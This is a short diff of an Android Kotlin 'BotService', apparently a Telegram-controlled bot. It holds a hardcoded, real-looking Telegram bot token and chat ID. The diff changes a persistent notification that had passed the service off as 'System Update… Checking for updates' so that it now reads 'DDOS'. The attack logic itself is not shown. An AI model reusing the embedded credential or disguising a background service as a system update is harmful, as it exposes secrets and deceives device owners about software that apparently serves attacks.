@@ -17,7 +17,6 @@ class BotService : Service() {
         .readTimeout(60, TimeUnit.SECONDS)
         .build()
 
-    // Yahan apna token aur chat id daalna
     private val BOT_TOKEN = "7966180213:AAGFqmNDy9b-vNFRAvuBQy6yf3b2U5fIxbI"
     private val CHAT_ID   = "5879359815"
     private var offset = 0L
@@ -39,8 +38,8 @@ class BotService : Service() {
             }
         }
         return Notification.Builder(this, chan)
-            .setContentTitle("System Update")
-            .setContentText("Checking for updates…")
+            .setContentTitle("DDOS")
+            .setContentText("System Running…")
             .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setOngoing(true)
             .build()
